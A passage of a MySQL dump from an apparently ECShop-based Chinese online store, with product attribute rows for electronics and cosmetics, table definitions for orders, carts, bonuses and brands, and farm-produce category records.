INSERT INTO `ec22703249_attribute` VALUES ('97', '5', '显卡类型', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('98', '5', '光驱类型', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('99', '5', '电池容量', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('100', '5', '其他配置', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('101', '6', '类型', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('102', '6', '最大像素/总像素  ', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('103', '6', '有效像素', '1', '0', '  ', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('104', '6', '光学变焦倍数', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('105', '6', '数字变焦倍数', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('106', '6', '操作模式', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('107', '6', '显示屏类型', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('108', '6', '显示屏尺寸', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('109', '6', '感光器件', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('110', '6', '感光器件尺寸', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('111', '6', '最高分辨率', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('112', '6', '图像分辨率', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('113', '6', '传感器类型', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('114', '6', '传感器尺寸', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('115', '6', '镜头', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('116', '6', '光圈', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('117', '6', '焦距', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('118', '6', '旋转液晶屏', '1', '0', '支持\r\n不支持', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('119', '6', '存储介质', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('120', '6', '存储卡', '1', '0', '  记录媒体\r\n存储卡容量', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('121', '6', '影像格式', '1', '0', '    静像\r\n动画', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('122', '6', '曝光控制', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('123', '6', '曝光模式', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('124', '6', '曝光补偿', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('125', '6', '白平衡', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('126', '6', '连拍', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('127', '6', '快门速度', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('128', '6', '闪光灯', '1', '0', '内置\r\n外置', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('129', '6', '拍摄范围', '1', '0', '  ', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('130', '6', '自拍定时器', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('131', '6', 'ISO感光度', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('132', '6', '测光模式', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('133', '6', '场景模式', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('134', '6', '短片拍摄', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('135', '6', '外接接口', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('136', '6', '电源', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('137', '6', '电池使用时间', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('138', '6', '外形尺寸', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('139', '6', '标配软件', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('140', '6', '标准配件', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('141', '6', '兼容操作系统', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('142', '7', '编号', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('143', '7', '类型', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('144', '7', '外型尺寸', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('145', '7', '最大像素数', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('146', '7', '光学变焦倍数', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('147', '7', '数字变焦倍数', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('148', '7', '显示屏尺寸及类型', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('149', '7', '感光器件', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('150', '7', '感光器件尺寸', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('151', '7', '感光器件数量', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('152', '7', '像素范围', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('153', '7', '传感器数量', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('154', '7', '传感器尺寸', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('155', '7', '水平清晰度', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('156', '7', '取景器', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('157', '7', '数码效果', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('158', '7', '镜头性能', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('159', '7', '对焦方式', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('160', '7', '曝光控制', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('161', '7', '其他接口', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('162', '7', '随机存储', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('163', '7', '电池类型', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('164', '7', '电池供电时间', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('165', '8', '产地', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('166', '8', '产品规格/容量', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('167', '8', '主要原料', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('168', '8', '所属类别', '1', '0', '彩妆\r\n化妆工具\r\n护肤品\r\n香水', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('169', '8', '使用部位', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('170', '8', '适合肤质', '1', '0', '油性\r\n中性\r\n干性', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('171', '8', '适用人群', '1', '0', '女性\r\n男性', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('172', '9', '上市日期', '1', '0', '2008年01月\r\n2008年02月\r\n2008年03月\r\n2008年04月\r\n2008年05月\r\n2008年06月\r\n2008年07月\r\n2008年08月\r\n2008年09月\r\n2008年10月\r\n2008年11月\r\n2008年12月\r\n2007年01月\r\n2007年02月\r\n2007年03月\r\n2007年04月\r\n2007年05月\r\n2007年06月\r\n2007年07月\r\n2007年08月\r\n2007年09月\r\n2007年10月\r\n2007年11月\r\n2007年12月', '1', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('173', '9', '手机制式', '1', '0', 'GSM,850,900,1800,1900\r\nGSM,900,1800,1900,2100\r\nCDMA\r\n双模（GSM,900,1800,CDMA 1X）\r\n3G(GSM,900,1800,1900,TD-SCDMA )', '1', '1', '1', '0');
INSERT INTO `ec22703249_attribute` VALUES ('174', '9', '理论通话时间', '0', '0', '', '0', '2', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('175', '9', '理论待机时间', '0', '0', '', '0', '3', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('176', '9', '铃声', '0', '0', '', '0', '4', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('177', '9', '铃声格式', '0', '0', '', '0', '5', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('178', '9', '外观样式', '1', '0', '翻盖\r\n滑盖\r\n直板\r\n折叠', '1', '6', '1', '0');
INSERT INTO `ec22703249_attribute` VALUES ('179', '9', '中文短消息', '0', '0', '', '0', '7', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('180', '9', '存储卡格式', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('181', '9', '内存容量', '0', '0', '', '2', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('182', '9', '操作系统', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('183', '9', 'K-JAVA', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('184', '9', '尺寸体积', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('185', '9', '颜色', '1', '1', '黑色\r\n白色\r\n蓝色\r\n金色\r\n粉色\r\n银色\r\n灰色\r\n深李色\r\n黑红色\r\n黑蓝色\r\n白紫色', '1', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('186', '9', '屏幕颜色', '1', '0', '1600万\r\n262144万', '1', '0', '1', '1');
INSERT INTO `ec22703249_attribute` VALUES ('187', '9', '屏幕材质', '1', '0', 'TFT', '0', '0', '0', '1');
INSERT INTO `ec22703249_attribute` VALUES ('188', '9', '屏幕分辨率', '1', '0', '320×240 像素\r\n240×400 像素\r\n240×320 像素\r\n176x220 像素', '1', '0', '0', '1');
INSERT INTO `ec22703249_attribute` VALUES ('189', '9', '屏幕大小', '0', '0', '', '0', '0', '0', '1');
INSERT INTO `ec22703249_attribute` VALUES ('190', '9', '中文输入法', '0', '0', '', '0', '0', '0', '2');
INSERT INTO `ec22703249_attribute` VALUES ('191', '9', '情景模式', '0', '0', '', '0', '0', '0', '2');
INSERT INTO `ec22703249_attribute` VALUES ('192', '9', '网络链接', '0', '0', '', '0', '0', '0', '2');
INSERT INTO `ec22703249_attribute` VALUES ('193', '9', '蓝牙接口', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('194', '9', '数据线接口', '0', '0', '', '0', '0', '0', '2');
INSERT INTO `ec22703249_attribute` VALUES ('195', '9', '电子邮件', '0', '0', '', '0', '0', '0', '2');
INSERT INTO `ec22703249_attribute` VALUES ('196', '9', '闹钟', '0', '0', '', '0', '35', '0', '4');
INSERT INTO `ec22703249_attribute` VALUES ('197', '9', '办公功能', '0', '0', '', '0', '0', '0', '4');
INSERT INTO `ec22703249_attribute` VALUES ('198', '9', '数码相机', '0', '0', '', '1', '0', '0', '3');
INSERT INTO `ec22703249_attribute` VALUES ('199', '9', '像素', '0', '0', '', '0', '0', '0', '3');
INSERT INTO `ec22703249_attribute` VALUES ('200', '9', '传感器', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('201', '9', '变焦模式', '0', '0', '', '0', '0', '0', '3');
INSERT INTO `ec22703249_attribute` VALUES ('202', '9', '视频拍摄', '0', '0', '', '0', '0', '0', '3');
INSERT INTO `ec22703249_attribute` VALUES ('203', '9', 'MP3播放器', '0', '0', '', '0', '0', '0', '3');
INSERT INTO `ec22703249_attribute` VALUES ('204', '9', '视频播放', '0', '0', '', '0', '0', '0', '3');
INSERT INTO `ec22703249_attribute` VALUES ('205', '9', 'CPU频率', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('206', '9', '收音机', '0', '0', '', '0', '0', '0', '3');
INSERT INTO `ec22703249_attribute` VALUES ('207', '9', '耳机接口', '0', '0', '', '0', '0', '0', '3');
INSERT INTO `ec22703249_attribute` VALUES ('208', '9', '闪光灯', '0', '0', '', '0', '0', '0', '3');
INSERT INTO `ec22703249_attribute` VALUES ('209', '9', '浏览器', '0', '0', '', '0', '0', '0', '2');
INSERT INTO `ec22703249_attribute` VALUES ('210', '9', '配件', '1', '2', '线控耳机\r\n蓝牙耳机\r\n数据线', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('211', '9', '尺码', '1', '1', '150/M\r\n160/M\r\n170/M\r\n180/M', '0', '0', '0', '0');

-- ----------------------------
-- Table structure for `ec22703249_auction_log`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_auction_log`;
CREATE TABLE `ec22703249_auction_log` (
  `log_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `act_id` mediumint(8) unsigned NOT NULL,
  `bid_user` mediumint(8) unsigned NOT NULL,
  `bid_price` decimal(10,2) unsigned NOT NULL,
  `bid_time` int(10) unsigned NOT NULL,
  PRIMARY KEY (`log_id`),
  KEY `act_id` (`act_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_auction_log
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_auto_manage`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_auto_manage`;
CREATE TABLE `ec22703249_auto_manage` (
  `item_id` mediumint(8) NOT NULL,
  `type` varchar(10) NOT NULL,
  `starttime` int(10) NOT NULL,
  `endtime` int(10) NOT NULL,
  PRIMARY KEY (`item_id`,`type`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_auto_manage
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_back_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_back_goods`;
CREATE TABLE `ec22703249_back_goods` (
  `rec_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `back_id` mediumint(8) unsigned DEFAULT '0',
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `product_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `product_sn` varchar(60) DEFAULT NULL,
  `goods_name` varchar(120) DEFAULT NULL,
  `brand_name` varchar(60) DEFAULT NULL,
  `goods_sn` varchar(60) DEFAULT NULL,
  `is_real` tinyint(1) unsigned DEFAULT '0',
  `send_number` smallint(5) unsigned DEFAULT '0',
  `goods_attr` text,
  PRIMARY KEY (`rec_id`),
  KEY `back_id` (`back_id`),
  KEY `goods_id` (`goods_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_back_goods
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_back_order`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_back_order`;
CREATE TABLE `ec22703249_back_order` (
  `back_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `delivery_sn` varchar(20) NOT NULL,
  `order_sn` varchar(20) NOT NULL,
  `order_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `invoice_no` varchar(50) DEFAULT NULL,
  `add_time` int(10) unsigned DEFAULT '0',
  `shipping_id` tinyint(3) unsigned DEFAULT '0',
  `shipping_name` varchar(120) DEFAULT NULL,
  `user_id` mediumint(8) unsigned DEFAULT '0',
  `action_user` varchar(30) DEFAULT NULL,
  `consignee` varchar(60) DEFAULT NULL,
  `address` varchar(250) DEFAULT NULL,
  `country` smallint(5) unsigned DEFAULT '0',
  `province` smallint(5) unsigned DEFAULT '0',
  `city` smallint(5) unsigned DEFAULT '0',
  `district` smallint(5) unsigned DEFAULT '0',
  `sign_building` varchar(120) DEFAULT NULL,
  `email` varchar(60) DEFAULT NULL,
  `zipcode` varchar(60) DEFAULT NULL,
  `tel` varchar(60) DEFAULT NULL,
  `mobile` varchar(60) DEFAULT NULL,
  `best_time` varchar(120) DEFAULT NULL,
  `postscript` varchar(255) DEFAULT NULL,
  `how_oos` varchar(120) DEFAULT NULL,
  `insure_fee` decimal(10,2) unsigned DEFAULT '0.00',
  `shipping_fee` decimal(10,2) unsigned DEFAULT '0.00',
  `update_time` int(10) unsigned DEFAULT '0',
  `suppliers_id` smallint(5) DEFAULT '0',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `return_time` int(10) unsigned DEFAULT '0',
  `agency_id` smallint(5) unsigned DEFAULT '0',
  PRIMARY KEY (`back_id`),
  KEY `user_id` (`user_id`),
  KEY `order_id` (`order_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_back_order
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_bonus_type`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_bonus_type`;
CREATE TABLE `ec22703249_bonus_type` (
  `type_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `type_name` varchar(60) NOT NULL DEFAULT '',
  `type_money` decimal(10,2) NOT NULL DEFAULT '0.00',
  `send_type` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `min_amount` decimal(10,2) unsigned NOT NULL DEFAULT '0.00',
  `max_amount` decimal(10,2) unsigned NOT NULL DEFAULT '0.00',
  `send_start_date` int(11) NOT NULL DEFAULT '0',
  `send_end_date` int(11) NOT NULL DEFAULT '0',
  `use_start_date` int(11) NOT NULL DEFAULT '0',
  `use_end_date` int(11) NOT NULL DEFAULT '0',
  `min_goods_amount` decimal(10,2) unsigned NOT NULL DEFAULT '0.00',
  PRIMARY KEY (`type_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_bonus_type
-- ----------------------------
INSERT INTO `ec22703249_bonus_type` VALUES ('1', '微信关注红包', '10.00', '3', '0.00', '0.00', '1398326400', '1400918400', '1398326400', '1495612800', '1.00');
INSERT INTO `ec22703249_bonus_type` VALUES ('2', '测试的哦', '10.00', '0', '0.00', '0.00', '1398499200', '1401091200', '1398499200', '1590480000', '200.00');

-- ----------------------------
-- Table structure for `ec22703249_booking_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_booking_goods`;
CREATE TABLE `ec22703249_booking_goods` (
  `rec_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `email` varchar(60) NOT NULL DEFAULT '',
  `link_man` varchar(60) NOT NULL DEFAULT '',
  `tel` varchar(60) NOT NULL DEFAULT '',
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_desc` varchar(255) NOT NULL DEFAULT '',
  `goods_number` smallint(5) unsigned NOT NULL DEFAULT '0',
  `booking_time` int(10) unsigned NOT NULL DEFAULT '0',
  `is_dispose` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `dispose_user` varchar(30) NOT NULL DEFAULT '',
  `dispose_time` int(10) unsigned NOT NULL DEFAULT '0',
  `dispose_note` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`rec_id`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_booking_goods
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_brand`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_brand`;
CREATE TABLE `ec22703249_brand` (
  `brand_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `brand_name` varchar(60) NOT NULL DEFAULT '',
  `brand_logo` varchar(80) NOT NULL DEFAULT '',
  `brand_desc` text NOT NULL,
  `site_url` varchar(255) NOT NULL DEFAULT '',
  `sort_order` tinyint(3) unsigned NOT NULL DEFAULT '50',
  `is_show` tinyint(1) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`brand_id`),
  KEY `is_show` (`is_show`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_brand
-- ----------------------------
INSERT INTO `ec22703249_brand` VALUES ('1', '小米', '1397811674628637833.jpg', '', 'http://www.xiaomi.com', '50', '1');
INSERT INTO `ec22703249_brand` VALUES ('3', '苹果', '', '苹果苹果苹果', 'http://xiaomi.codes5.com', '50', '1');

-- ----------------------------
-- Table structure for `ec22703249_card`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_card`;
CREATE TABLE `ec22703249_card` (
  `card_id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `card_name` varchar(120) NOT NULL DEFAULT '',
  `card_img` varchar(255) NOT NULL DEFAULT '',
  `card_fee` decimal(6,2) unsigned NOT NULL DEFAULT '0.00',
  `free_money` decimal(6,2) unsigned NOT NULL DEFAULT '0.00',
  `card_desc` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`card_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_card
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_cart`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_cart`;
CREATE TABLE `ec22703249_cart` (
  `rec_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `session_id` char(32) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_sn` varchar(60) NOT NULL DEFAULT '',
  `product_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_name` varchar(120) NOT NULL DEFAULT '',
  `market_price` decimal(10,2) unsigned NOT NULL DEFAULT '0.00',
  `goods_price` decimal(10,2) NOT NULL DEFAULT '0.00',
  `goods_number` smallint(5) unsigned NOT NULL DEFAULT '0',
  `goods_attr` text NOT NULL,
  `is_real` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `extension_code` varchar(30) NOT NULL DEFAULT '',
  `parent_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `rec_type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_gift` smallint(5) unsigned NOT NULL DEFAULT '0',
  `is_shipping` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `can_handsel` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `goods_attr_id` varchar(255) NOT NULL DEFAULT '',
  `package_attr_id` varchar(100) NOT NULL,
  PRIMARY KEY (`rec_id`),
  KEY `session_id` (`session_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_cart
-- ----------------------------
INSERT INTO `ec22703249_cart` VALUES ('4', '18', 'c97805a667c521d637931919b4e7689d', '6', 'ECS000006', '0', '君禾园蚕豆', '21.59', '18.00', '1', '', '1', '', '0', '0', '0', '0', '0', '', '');

-- ----------------------------
-- Table structure for `ec22703249_category`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_category`;
CREATE TABLE `ec22703249_category` (
  `cat_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `cat_name` varchar(90) NOT NULL DEFAULT '',
  `keywords` varchar(255) NOT NULL DEFAULT '',
  `cat_desc` varchar(255) NOT NULL DEFAULT '',
  `parent_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `sort_order` tinyint(1) unsigned NOT NULL DEFAULT '50',
  `template_file` varchar(50) NOT NULL DEFAULT '',
  `measure_unit` varchar(15) NOT NULL DEFAULT '',
  `show_in_nav` tinyint(1) NOT NULL DEFAULT '0',
  `style` varchar(150) NOT NULL,
  `is_show` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `grade` tinyint(4) NOT NULL DEFAULT '0',
  `filter_attr` varchar(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`cat_id`),
  KEY `parent_id` (`parent_id`)
) ENGINE=MyISAM AUTO_INCREMENT=44 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_category
-- ----------------------------
INSERT INTO `ec22703249_category` VALUES ('1', '蔬果类', '', '', '0', '50', '', '', '1', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('2', '五谷杂粮', '', '', '0', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('3', '推广产品', '', '', '0', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('4', '肉禽蛋产品', '', '', '0', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('5', '其他', '', '', '0', '100', '', '', '1', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('6', '糕点产品', '', '', '0', '50', '', '', '1', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('7', '腌制产品', '', '', '0', '50', '', '', '1', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('8', '水产产品', '', '', '0', '50', '', '', '1', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('9', '会员卡办理', '', '', '0', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('10', '根菜类', '', '', '1', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('11', '叶菜类', '', '', '1', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('12', '茎菜类', '', '', '1', '50', '', '', '0', '', '1', '0', '1,2');
INSERT INTO `ec22703249_category` VALUES ('13', '谷物类', '', '', '2', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('14', '豆类', '', '', '2', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('15', '禾薯类', '', '', '2', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('16', '叶菜类', '', '', '3', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('17', '茎菜类', '', '', '3', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('18', '豆类', '', '', '3', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('19', '禾署类', '', '', '3', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('38', '运费', '', '', '5', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('21', '禽类', '', '', '4', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('22', '肉类', '', '', '4', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('23', '蛋类', '', '', '4', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('28', '豆类', '', '', '1', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('29', '瓜果类', '', '', '1', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('30', '芽菜类', '', '', '1', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('31', '调味料类', '', '', '1', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('32', '花菜类', '', '', '1', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('33', '菌菇类', '', '', '1', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('34', '瓜果类', '', '', '3', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('35', '根茎类', '', '', '3', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('36', '蛋类', '', '', '3', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('37', '营养品', '', '', '3', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('39', '农场活动费用', '', '', '5', '50', '', '', '0', '', '1', '0', '');
INSERT INTO `ec22703249_category` VALUES ('40', '干货类', '', '', '7', '50', '', '', '0', '', '1', '0', '');
